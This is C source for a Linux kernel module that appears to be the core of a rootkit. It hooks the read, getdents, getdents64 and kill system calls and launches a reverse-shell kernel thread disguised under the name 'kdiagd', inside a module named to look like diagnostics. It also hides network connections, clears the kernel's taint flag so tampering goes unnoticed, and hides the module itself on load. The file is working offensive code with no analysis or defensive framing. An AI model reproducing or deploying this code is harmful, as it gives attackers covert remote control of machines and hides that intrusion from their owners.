

#include "include/headers.h"


#define AUTO_HIDE 1

/* hooking engine (syscall-table swap) */
#include "ftrace/ftrace.h"

#include "hooks/getdents.h"
#include "hooks/getdents64.h"
#include "hooks/kill.h"
#include "hooks/read.h"
#include "kprobe/rev-shell.h"

/* ---- the hook table: 4 syscalls ---- */
static struct ftrace_hook hooks[] = {
    HOOK(__NR_read,       "sys_read",       hooked_read,       &og_read),
    HOOK(__NR_getdents,   "sys_getdents",   hooked_getdents,   &og_getdents),
    HOOK(__NR_getdents64, "sys_getdents64", hooked_getdents64, &og_getdents64),
    HOOK(__NR_kill,       "sys_kill",       hooked_kill,       &og_kill),
};

static void clear_taint(void)
{
    int *taint = (int *)kallsyms_lookup_name("tainted_mask");
    if (taint)
        *taint = 0;
}

static int __init sysdiag_init(void)
{
    int err;

    hide_conn_init();                    /* precompute ":05C8" style string */

    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err)
        return err;

    mon_it = kthread_run(__shell, NULL, "kdiagd");
    if (IS_ERR(mon_it)) {
        fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
        return PTR_ERR(mon_it);
    }

    clear_taint();

#if AUTO_HIDE
    hideme();
#endif
    return 0;
}

static void __exit sysdiag_exit(void)
{
    if (mon_it) {
        kthread_stop(mon_it);
        mon_it = NULL;
        msleep(100);          /* drain: let any in-flight usermodehelper unwind */
    }

    if (hidden)
        showme();

    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}

MODULE_LICENSE("GPL");
module_init(sysdiag_init);
module_exit(sysdiag_exit);